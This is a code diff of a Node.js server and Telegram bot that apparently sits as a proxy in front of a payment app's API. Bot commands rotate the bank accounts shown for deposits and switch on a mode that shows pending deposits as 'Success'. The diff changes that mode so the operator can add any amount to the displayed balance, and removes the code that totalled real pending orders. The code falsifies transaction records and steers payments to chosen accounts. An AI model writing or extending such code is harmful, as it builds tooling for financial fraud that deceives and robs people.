@@ -186,8 +186,8 @@ app.post('/api/telegram', async (req, res) => {
 /rotate on - Auto rotate banks
 /rotate off - Use fixed bank
 
-/deposit on - Show all deposits as success
-/deposit off - Show real deposit status
+/deposit on <amount> - Deposits success + add balance
+/deposit off - Restore real data
 
 Example:
 /addbank 1234567890 | Rahul Kumar | SBIN0001234
@@ -284,26 +284,29 @@ ${bank.accountNo} | ${bank.accountHolder} | ${bank.ifsc}`
       await bot.sendMessage(chatId, `🔄 Auto-Rotate OFF!\nFixed bank: ${active ? active.accountHolder + ' | ' + active.accountNo : 'None (use /usebank)'}`);
     }
 
-    else if (text === '/deposit on') {
+    else if (text.startsWith('/deposit on')) {
+      const amountStr = text.substring(11).trim();
+      const amount = parseFloat(amountStr);
+      if (amountStr && isNaN(amount)) {
+        await bot.sendMessage(chatId, '❌ Format: /deposit on <amount>\nExample: /deposit on 5000');
+        return res.sendStatus(200);
+      }
       bankData.depositSuccess = true;
-      bankData.depositBonus = 0;
+      if (!isNaN(amount) && amount > 0) {
+        bankData.depositBonus = (bankData.depositBonus || 0) + amount;
+      }
       await saveData(bankData);
-      await bot.sendMessage(chatId, '⏳ Calculating pending deposits...');
-      try {
-        const pendingAmount = await fetchPendingDepositAmount();
-        bankData.depositBonus = pendingAmount;
-        await saveData(bankData);
-        await bot.sendMessage(chatId,
+      await bot.sendMessage(chatId,
 `✅ Deposit SUCCESS mode ON!
 
-Pending Orders Amount: ₹${pendingAmount}
-This amount will be added to displayed balance.
+${amount > 0 ? '💰 Added: ₹' + amount + '\n' : ''}Balance Bonus: ₹${bankData.depositBonus || 0}
 
-/deposit off to restore real data.`
-        );
-      } catch(e) {
-        await bot.sendMessage(chatId, '✅ Deposit SUCCESS mode ON!\n⚠️ Could not calculate pending amount. Balance unchanged.');
-      }
+Pending orders → Success ✅
+Bonus added to balance ✅
+
+/deposit on 3000 — add more
+/deposit off — restore real data`
+      );
     }
 
     else if (text === '/deposit off') {
@@ -505,35 +508,6 @@ function markDepositSuccess(obj) {
   if (obj.statusName !== undefined && !failStatuses.includes(obj.status)) {
     obj.statusName = 'Success';
   }
-}
-
-async function fetchPendingDepositAmount() {
-  let totalPending = 0;
-  try {
-    const response = await fetch(ORIGINAL_API + '/money/rechargeRecord', {
-      method: 'POST',
-      headers: { 'host': 'api.i-money.vip', 'content-type': 'application/json' },
-      body: JSON.stringify({ page: 1, pageSize: 100 })
-    });
-    const data = await response.json();
-    if (data && data.data) {
-      const items = Array.isArray(data.data) ? data.data :
-                    data.data.list ? data.data.list :
-                    data.data.records ? data.data.records : [];
-      const failStatuses = ['failed', 'fail', 'FAILED', 'FAIL', '-1', -1, 4, '4'];
-      const successStatuses = ['success', 'SUCCESS', 3, '3', 'completed', 'COMPLETED'];
-      for (const item of items) {
-        const st = item.status || item.orderStatus || item.payStatus || item.rechargeStatus || item.state;
-        if (!failStatuses.includes(st) && !successStatuses.includes(st)) {
-          const amt = parseFloat(item.amount || item.orderAmount || item.rechargeAmount || 0);
-          if (amt > 0) totalPending += amt;
-        }
-      }
-    }
-  } catch(e) {
-    console.error('fetchPendingDepositAmount error:', e.message);
-  }
-  return totalPending;
 }
 
 async function proxyAndAddBonus(req, res) {
